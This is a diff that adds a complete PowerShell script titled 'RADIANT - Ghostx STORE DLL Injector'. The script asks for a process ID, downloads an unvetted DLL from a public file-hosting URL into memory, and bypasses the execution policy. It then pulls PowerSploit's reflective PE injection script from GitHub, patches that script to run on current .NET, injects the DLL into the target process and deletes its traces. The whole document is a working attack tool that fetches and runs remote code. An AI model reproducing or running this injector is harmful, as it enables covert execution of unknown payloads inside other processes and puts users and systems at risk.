@@ -1,0 +1,60 @@
+Invoke-Command -ScriptBlock {
+    Clear-Host
+    Write-Host "=====================================" -ForegroundColor Cyan
+    Write-Host "   RADIANT - Ghostx STORE DLL Injector   " -ForegroundColor Cyan
+    Write-Host "=====================================" -ForegroundColor Cyan
+    Write-Host ""
+    
+    $pidInput = Read-Host ">>> Enter Target PID"
+    if (-not $pidInput) {
+        Write-Host "[-] No PID entered. Exiting..." -ForegroundColor Red
+        return
+    }
+    $targetPid = [int]$pidInput
+    
+    $dllUrl = "https://files.catbox.moe/621w8f.dll"
+    Write-Host "[*] Downloading DLL to Memory..." -ForegroundColor Yellow
+    
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
+        $dllBytes = $webClient.DownloadData($dllUrl)
+        Write-Host "[+] DLL Downloaded! Size: $($dllBytes.Length) bytes." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to download DLL." -ForegroundColor Red
+        return
+    }
+    
+    Write-Host "[*] Preparing RADIANT - Ghostx STORE Injector..." -ForegroundColor Yellow
+    $powerSploitUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
+    $tempScript = "$env:TEMP\Invoke-Reflective_$(Get-Random).ps1"
+    
+    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
+    
+    try {
+        Invoke-WebRequest -Uri $powerSploitUrl -OutFile $tempScript -UseBasicParsing -ErrorAction Stop
+        $scriptContent = Get-Content $tempScript -Raw
+    
+        $scriptContent = $scriptContent -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
+        $scriptContent = $scriptContent -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
+    
+        $scriptContent | Set-Content $tempScript -Encoding UTF8
+        
+        . $tempScript
+    } catch {
+        Write-Host "[-] Failed to prepare injector: $_" -ForegroundColor Red
+        return
+    }
+    
+    Write-Host "[*] Injecting into PID: $targetPid..." -ForegroundColor Yellow
+    
+    try {
+        Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $targetPid
+        Write-Host "[+] SUCCESS! Injection completed cleanly." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Injection Failed: $_" -ForegroundColor Red
+    }
+    
+    Write-Host "[*] Cleaning up temporary files..." -ForegroundColor DarkGray
+    Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
+}
